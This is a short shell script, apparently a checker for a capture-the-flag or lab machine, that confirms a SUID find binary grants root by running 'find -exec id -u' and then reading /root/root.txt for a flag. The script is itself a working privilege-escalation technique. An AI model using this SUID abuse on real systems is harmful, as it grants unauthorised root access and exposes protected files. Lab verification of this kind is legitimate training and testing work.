#!/bin/sh
# Prove the SUID find binary escalates: read root.txt through it.
set -eu
uid=$(/usr/bin/find /root/root.txt -exec id -u \; 2>/dev/null | tr -d '[:space:]')
[ "$uid" = "0" ] || { echo "SUID find did not give root (uid=$uid)" >&2; exit 1; }
/usr/bin/find /root/root.txt -exec cat {} \; | grep -q 'FLAG{root-' \
    || { echo "root.txt not readable via SUID find" >&2; exit 1; }
echo "root achieved via SUID find"
